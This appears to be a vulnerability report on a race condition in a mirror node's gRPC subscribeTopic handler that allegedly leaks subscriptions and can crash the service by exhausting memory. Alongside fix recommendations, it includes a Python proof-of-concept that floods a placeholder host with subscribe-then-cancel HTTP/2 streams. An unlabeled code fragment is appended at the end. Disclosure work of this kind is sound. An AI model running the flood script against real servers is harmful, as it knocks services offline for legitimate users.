### Title
Unauthenticated Subscribe-Cancel Flood via Race Condition in `subscribeTopic()` Causes Subscription Leak and OOM

### Summary
`ConsensusController.subscribeTopic()` registers the cancel handler (`disposable::dispose`) **after** the reactive subscription is already started. A gRPC cancel signal arriving in this window leaves the subscription permanently undisposed. Because there is no per-IP connection limit, no rate limit on `subscribeTopic`, and no cap on total subscriptions, an unprivileged attacker can open unlimited connections, trigger this race on each, and accumulate leaked subscriptions that hold DB connections, scheduled tasks, and Redis listeners until the JVM runs out of memory.

### Finding Description

**Exact code path:**

`ConsensusController.subscribeTopic()` at lines 44–52:

```java
final var disposable = Mono.fromCallable(() -> toFilter(request))
        .flatMapMany(topicMessageService::subscribeTopic)   // starts reactive chain
        .map(this::toResponse)
        .onErrorMap(ProtoUtil::toStatusRuntimeException)
        .subscribe(...);   // line 48 — subscription is LIVE here

if (responseObserver instanceof ServerCallStreamObserver serverCallStreamObserver) {
    serverCallStreamObserver.setOnCancelHandler(disposable::dispose);  // line 51 — handler set AFTER
}
``` [1](#0-0) 

**Root cause — failed assumption:** The code assumes the gRPC cancel signal cannot arrive between line 48 and line 51. This assumption is wrong. In gRPC-Java, cancel signals are delivered on the Netty I/O thread, while `subscribeTopic()` runs on the application executor thread. The window is small but real and reliably triggerable under load. If cancel arrives before `setOnCancelHandler` is called, no handler is ever registered, and the `Disposable` is never disposed.

**Per-subscription resource allocation in `TopicMessageServiceImpl.subscribeTopic()`:**

Each leaked subscription holds:
- A `TopicContext` (with `AtomicLong`, `AtomicReference`, `Stopwatch`)
- A `PollingContext` inside `PollingTopicMessageRetriever` (with its own `AtomicLong`, `AtomicReference`, `Stopwatch`)
- A synchronous JPA DB call via `entityRepository.findById()` (line 96)
- A historical retriever flux (`topicMessageRetriever.retrieve(filter, true)`) polling the DB on `Schedulers.boundedElastic()`
- A `safetyCheck` flux: `Mono.delay(Duration.ofSeconds(1L)).subscribeOn(Schedulers.boundedElastic())` — schedules a task 1 second in the future that fires a DB query if not cancelled
- A live listener flux via `topicListener.listen(newFilter)` — for Redis, this joins a shared Redis subscription [2](#0-1) [3](#0-2) 

**Why existing checks are insufficient:**

`maxConcurrentCallsPerConnection = 5` (the only server-side guard) limits concurrent calls **per connection**, not total connections. There is no per-IP connection limit, no global connection cap, and no rate limit on `subscribeTopic` in the gRPC module. [4](#0-3) [5](#0-4) 

The `subscriberCount` `AtomicLong` is a metric gauge only — it enforces nothing. [6](#0-5) 

The `web3` module has a full `ThrottleConfiguration` with bucket4j rate limiting; the `grpc` module has no equivalent. [7](#0-6) 

### Impact Explanation

Each leaked subscription holds at minimum one `boundedElastic` thread task, one DB connection from the HikariCP pool, and associated heap objects. With enough leaked subscriptions, the HikariCP pool is exhausted (denying service to legitimate subscribers), the `boundedElastic` task queue grows unboundedly, and heap fills until OOM kills the JVM. Because the gRPC service is the only delivery path for HCS topic messages, an OOM crash constitutes a total mirror-node gRPC outage — legitimate clients cannot receive consensus topic messages.

### Likelihood Explanation

The attack requires no credentials, no special knowledge, and no privileged network position — only the ability to open TCP connections to port 5600. The race window (lines 48–51) is narrow but reliably hit when the attacker sends the cancel frame immediately after the HTTP/2 HEADERS frame (gRPC subscribe initiation). This is achievable with a simple script using any HTTP/2 library. The attack is repeatable and scalable: a single machine can open thousands of connections and trigger thousands of race-condition leaks per second. The `maxConcurrentCallsPerConnection = 5` guard means the attacker needs only `ceil(target_leaks / 5)` connections, which is trivially achievable.

### Recommendation

1. **Fix the race condition** — register the cancel handler before subscribing, or use an atomic flag:
   ```java
   AtomicBoolean cancelled = new AtomicBoolean(false);
   if (responseObserver instanceof ServerCallStreamObserver scso) {
       scso.setOnCancelHandler(() -> cancelled.set(true));
   }
   final var disposable = Mono.fromCallable(() -> toFilter(request))
       .flatMapMany(topicMessageService::subscribeTopic)
       ...
       .subscribe(...);
   if (cancelled.get()) disposable.dispose();
   ```
2. **Add a global subscription cap** — enforce a hard limit on concurrent active subscriptions (e.g., reject new subscriptions when `subscriberCount` exceeds a configurable threshold).
3. **Add per-IP connection rate limiting** — configure Netty's `maxConnectionsPerIp` or add a gRPC `ServerInterceptor` that tracks and limits connections per source IP.
4. **Add a gRPC-level rate limiter** — mirror the bucket4j throttle used in `web3` for the `subscribeTopic` endpoint.

### Proof of Concept

```python
import socket, ssl, h2.connection, h2.config, h2.events, threading, time

TARGET_HOST = "mirror-grpc-host"
TARGET_PORT = 5600
CONNECTIONS = 500   # open 500 parallel TCP connections

def attack_connection():
    sock = socket.create_connection((TARGET_HOST, TARGET_PORT))
    config = h2.config.H2Configuration(client_side=True)
    conn = h2.connection.H2Connection(config=config)
    conn.initiate_connection()
    sock.sendall(conn.data_to_send())

    # Send gRPC subscribeTopic HEADERS (stream 1)
    headers = [
        (':method', 'POST'),
        (':path', '/com.hedera.mirror.api.proto.ConsensusService/subscribeTopic'),
        (':scheme', 'http'),
        (':authority', f'{TARGET_HOST}:{TARGET_PORT}'),
        ('content-type', 'application/grpc'),
        ('te', 'trailers'),
    ]
    conn.send_headers(stream_id=1, headers=headers)
    # Send minimal valid protobuf body (topicID = 0.0.X)
    conn.send_data(stream_id=1, data=b'\x00\x00\x00\x00\x05\x0a\x03\x18\xd6\x06', end_stream=False)
    sock.sendall(conn.data_to_send())

    # Immediately send RST_STREAM to cancel — triggers the race window
    time.sleep(0.001)
    conn.reset_stream(stream_id=1)
    sock.sendall(conn.data_to_send())
    sock.close()

threads = [threading.Thread(target=attack_connection) for _ in range(CONNECTIONS)]
for t in threads: t.start()
for t in threads: t.join()
# Repeat in a loop; monitor grpc pod memory — OOM expected within minutes
```

Each iteration races the cancel signal against `setOnCancelHandler`. Leaked subscriptions accumulate, exhausting HikariCP connections and heap, leading to OOM and gRPC service crash.

    public Flux<TopicMessage> subscribeTopic(TopicMessageFilter filter) {
        log.info("Subscribing to topic: {}", filter);
        TopicContext topicContext = new TopicContext(filter);

        Flux<TopicMessage> historical = topicMessageRetriever.retrieve(filter, true);
        Flux<TopicMessage> live = Flux.defer(() -> incomingMessages(topicContext));

        // Safety Check - Polls missing messages after 1s if we are stuck with no data
        Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
                .filter(_ -> !topicContext.isComplete())
                .flatMapMany(_ -> missingMessages(topicContext, null))
                .subscribeOn(Schedulers.boundedElastic());

        Flux<TopicMessage> flux = historical
                .concatWith(Flux.merge(safetyCheck, live).takeUntilOther(pastEndTime(topicContext)))
                .filter(t -> {
                    TopicMessage last = topicContext.getLast();
                    return last == null || t.getSequenceNumber() > last.getSequenceNumber();
                });

        if (filter.getEndTime() != null) {
            flux = flux.takeWhile(t -> t.getConsensusTimestamp() < filter.getEndTime());
        }

        if (filter.hasLimit()) {
            flux = flux.take(filter.getLimit());
        }

        return topicExists(filter)
                .thenMany(flux.doOnNext(topicContext::onNext)
                        .doOnSubscribe(s -> subscriberCount.incrementAndGet())
                        .doFinally(s -> subscriberCount.decrementAndGet())
                        .doFinally(topicContext::finished));
```
